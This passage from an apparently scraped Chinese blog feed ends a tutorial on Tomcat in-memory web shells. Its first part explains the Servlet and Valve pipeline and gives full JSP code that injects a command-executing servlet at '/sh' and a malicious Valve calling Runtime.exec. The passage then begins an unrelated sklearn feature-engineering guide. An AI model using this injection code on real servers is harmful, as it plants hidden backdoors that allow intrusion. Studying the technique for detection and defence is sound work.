punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> contextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token comment">//2.注册进入context</span>    <span class="token comment">//根据ContextConfig#configureContext方法注册servlet</span>    <span class="token comment">//对应着xml配置文件配置Servlet</span>    <span class="token comment">//设置名称和类</span>    <span class="token class-name">Wrapper</span> wrapper <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span><span class="token class-name">CmdServlet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CmdServlet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//设置映射路径</span>    context<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span><span class="token string">"/sh"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>缺点:</p><ul><li>这种类型的内存马需要访问具体路径才能够命令执行，日志中比较容易被发现</li></ul><p>优点:</p><ul><li>兼容性强，兼容tomcat7</li></ul><h2 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h2><h3 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h3><p> 当Tomcat接收到客户端请求时，首先会使用Connector进行解析，然后发送到Container进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。<br>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制<br><img src="/img/3-6/28.png"><br> 在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。<br>我们先来看看Pipeline接口，继承了Contained接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pipeline</span> <span class="token keyword">extends</span> <span class="token class-name">Contained</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token class-name">Valve</span> <span class="token function">getBasic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBasic</span><span class="token punctuation">(</span><span class="token class-name">Valve</span> valve<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addValve</span><span class="token punctuation">(</span><span class="token class-name">Valve</span> valve<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token class-name">Valve</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getValves</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">removeValve</span><span class="token punctuation">(</span><span class="token class-name">Valve</span> valve<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Valve</span> <span class="token function">getFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">findNonAsyncValves</span><span class="token punctuation">(</span><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>Pipeline接口提供了各种对Valve的操作方法，如我们可以通过addValve()方法来添加一个Valve。下面我们再来看看Valve接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Valve</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token class-name">Valve</span> <span class="token function">getNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNext</span><span class="token punctuation">(</span><span class="token class-name">Valve</span> valve<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backgroundProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">,</span> <span class="token class-name">Response</span> response<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。<br><img src="/img/3-6/29.png"><br>同时Valve可以通过重写invoke()方法来实现具体的业务逻辑<br>如下面代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Shell_Valve</span> <span class="token keyword">extends</span> <span class="token class-name">ValveBase</span> <span class="token punctuation">{</span>         <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">,</span> <span class="token class-name">Response</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在org.apache.catalina.connector.CoyoteAdapter#service方法中</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span>Request</span> req<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span>Response</span> res<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>    <span class="token class-name">Request</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getNote</span><span class="token punctuation">(</span><span class="token constant">ADAPTER_NOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Response</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Response</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">getNote</span><span class="token punctuation">(</span><span class="token constant">ADAPTER_NOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// Create objects</span>            request <span class="token operator">=</span> connector<span class="token punctuation">.</span><span class="token function">createRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            request<span class="token punctuation">.</span><span class="token function">setCoyoteRequest</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>            response <span class="token operator">=</span> connector<span class="token punctuation">.</span><span class="token function">createResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setCoyoteResponse</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// Link objects</span>            request<span class="token punctuation">.</span><span class="token function">setResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// Set as notes</span>            req<span class="token punctuation">.</span><span class="token function">setNote</span><span class="token punctuation">(</span><span class="token constant">ADAPTER_NOTES</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">setNote</span><span class="token punctuation">(</span><span class="token constant">ADAPTER_NOTES</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// Set query string encoding</span>            req<span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setQueryStringCharset</span><span class="token punctuation">(</span>connector<span class="token punctuation">.</span><span class="token function">getURICharset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            connector<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPipeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>   request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><img src="/img/3-6/30.png">前面是对Request和Respone对象进行一些判断及创建操作,在这里打断点进行调式<pre class="language-java" data-language="java"><code class="language-java">connector<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPipeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>首先通过connector.getService()来获取一个StandardService对象<img src="/img/3-6/31.png">接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象<img src="/img/3-6/32.png">再通过StandardPipeline.getFirst()获取第一个Valve<img src="/img/3-6/33.png">最后通过调用StandardEngineValve.invoke()来实现Valve的各种业务逻辑进入StandardEngineValve#invoke方法<img src="/img/3-6/34.png">host.getPipeline().getFirst().invoke(request, response)实现调用后续的Valve。<h3 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h3><p>上面过程就像逐个Valve出栈,每次getFirst()获取Valve后，然后再invoke()<br>那么Valve就是注入一个恶意的Valve,我们知道一个网站对应一个Context<br>就对应着StandarContext类中，其也管理了Valve；·<br>直接寻找有无存储valve的属性,也就是实现了Pipeline接口的类<br><img src="/img/3-6/35.png"><br>找到属性pipeline<br><img src="/img/3-6/36.png"><br>这个属性在类中没有定义，说明是父类的。进入ContainerBase<br><img src="/img/3-6/37.png"><br>找到方法addValve<br><img src="/img/3-6/38.png"><br>根据上文的分析我们能够总结出Valve型内存马的注入思路</p><ol><li>获取StandardContext对象</li><li>通过StandardContext对象获取StandardPipeline,即pipeline属性</li><li>编写恶意Valve</li><li>通过StandardPipeline.addValve()动态添加Valve</li></ol><p>获取StandardContext对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> reqF <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reqF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>注入Valve</p><ul><li><p>实现接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Pipeline</span> pipeline <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getPipeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pipeline<span class="token punctuation">.</span><span class="token function">addValve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Valve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">Valve</span> <span class="token function">getNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNext</span><span class="token punctuation">(</span><span class="token class-name">Valve</span> valve<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backgroundProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">,</span> <span class="token class-name">Response</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>继承ValveBase重写invoke</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Pipeline</span> pipeline <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getPipeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pipeline<span class="token punctuation">.</span><span class="token function">addValve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ValveBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">,</span> <span class="token class-name">Response</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Pipeline"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Response"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.valves.ValveBase"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">&gt;</span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">&gt;</span></span><span class="token class-name">Title</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">&gt;</span></span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">Field</span> reqF <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    reqF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">Pipeline</span> pipeline <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getPipeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pipeline<span class="token punctuation">.</span><span class="token function">addValve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ValveBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">,</span> <span class="token class-name">Response</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span></code></pre></filter-mapping>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 内存马 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sklearn与特征工程</title>
      <link href="/2024/02/27/sklearn%E4%B8%8E%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B/"/>
      <url>/2024/02/27/sklearn%E4%B8%8E%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="sklearn与特征工程"><a href="#sklearn与特征工程" class="headerlink" title="sklearn与特征工程"></a>sklearn与特征工程</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="sklearn"><a href="#sklearn" class="headerlink" title="sklearn"></a>sklearn</h3><p>Scikit-learn（简称为 sklearn）是一个流行的 Python 机器学习库，用于在数据挖掘和数据分析领域中进行各种机器学习任务。它提供了简单而高效的工具，用于数据挖掘和数据分析，以及构建和评估各种机器学习模型。以下是关于 scikit-learn 的一些重要信息：</p><p><strong>功能特点</strong>：</p><ol><li>简单而一致的 API： Scikit-learn 提供了简单而一致的 API，使得用户可以方便地使用各种机器学习算法和工具。</li><li>广泛的算法库： Scikit-learn 包含了大量的机器学习算法和工具，涵盖了分类、回归、聚类、降维、模型选择、预处理等多个方面。</li><li>易于使用的工具： Scikit-learn 提供了各种易于使用的工具，如数据预处理、特征提取、模型评估等，使得用户能够更轻松地进行机器学习任务的建模和评估。</li><li>高效的实现： Scikit-learn 的算法和工具都经过了高度优化和性能调整，以保证其在大规模数据集上的高效性和可扩展性。</li></ol><p><strong>主要模块</strong>：</p><ol><li>sklearn.datasets： 包含了一些标准数据集，可以用于练习和测试机器学习算法。</li><li>sklearn.preprocessing： 提供了数据预处理功能，如标准化、归一化、缺失值处理等。</li><li>sklearn.feature_extraction： 提供了特征提取功能，如文本特征提取、图像特征提取等。</li><li>sklearn.model_selection： 提供了模型选择和评估功能，如交叉验证、网格搜索、模型评估指标等。</li><li>sklearn.metrics： 提供了常用的模型评估指标，如准确率、精确率、召回率、F1 值等。</li><li>sklearn.linear_model： 提供了线性模型算法，如线性回归、逻辑回归等。</li><li>sklearn.svm： 提供了支持向量机算法。</li><li>sklearn.tree： 提供了决策树算法。</li><li>sklearn.ensemble： 提供了集成学习算法，如随机森林、梯度提升树等。</li><li>sklearn.cluster： 提供了聚类算法，如 K 均值聚类、层次聚类等。</li></ol><h3 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h3><p>  特征工程是指在机器学习任务中使用的数据预处理和特征处理技术，旨在提取、构建和选择对模型训练有用的特征，从而改善模型的性能。特征工程是机器学习中非常重要的一部分，它直接影响到模型的性能和泛化能力。</p><p>包括特征提权，特征转化，特征降维</p><h2 id="数据集操作"><a href="#数据集操作" class="headerlink" title="数据集操作"></a>数据集操作</h2><p>软件包</p><ul><li>sklearn.datasets</li></ul><p><strong>加载获取数据集</strong>：</p><ol><li>datasets.load_*()</li></ol><p>获取小规模数据集，默认在库中包含有</p><ol><li>datasets.fetch_*(data_home=None)</li></ol><p>获取大规模数据集，需要从网络上下载，函数的第一个参数表示数据集下载路径，默认是~/scikit_learn_data/</p><p>示例</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>datasetsdata<span class="token operator">=</span>sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>数据集对象</strong></p><p>load和fatch返回的数据类型是datasets.base.Bunch(继承于字典)</p><p>属性</p><ul><li>data：特征数据数组，是二维numpy.ndarray数组</li><li>target：标签数组，是numpy.ndarray数组</li><li>DESCR: 数据描述</li><li>target_names: 标签名</li><li>feature_names: 特征名</li></ul><p><strong>数据集划分</strong></p><p>一般使用20%~30%的数据用于测试</p><ul><li>sklearn.model_selection.train_test_split(arrays,*options)</li></ul><ol><li>x数据集的特征值</li><li>y数据集的标签值</li><li>test_size:测试集大小，为float，默认为0.25</li><li>random_state：随机数种子</li></ol><p>返回值: 训练集特征值，测试集特征值，训练集目标值，测试集目标值</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>datasets<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span>  train_test_splitiris<span class="token operator">=</span>sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span>x_train<span class="token punctuation">,</span>x_test<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>y_test<span class="token operator">=</span>train_test_split<span class="token punctuation">(</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">,</span>iris<span class="token punctuation">.</span>target<span class="token punctuation">,</span>test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>random_state<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">)</span></code></pre><h2 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h2><p>概念：将任意数据（如文本或图像）转化为可用于机器学习的数字特征</p><p>分类：</p><ul><li>字典特征提权（特征离散化）</li><li>文本特征提取</li><li>图像特征提权</li></ul><p>特征提取api</p><pre class="language-none"><code class="language-none">sklearn.feature_extraction</code></pre><h3 id="字典特征提取"><a href="#字典特征提取" class="headerlink" title="字典特征提取"></a>字典特征提取</h3><p><strong>类</strong>：</p><p>sklearn.feature_extraction.DictVectorizer(sparse=True,…)  –实例化转化器</p><p>作用：对字典数据进行特征值化</p><p>默认返回sparse矩阵，若返回正常矩阵，设置sparse=False</p><p>（类别采用one-hot编码）</p><p>sparse矩阵：将非零值按照位置（元组）表示出来</p><p>转化为：</p><p>矩阵    matrix   二维数组</p><p>向量    vector   一维数组</p><p><strong>类方法</strong>：</p><ul><li>fit_transform( X 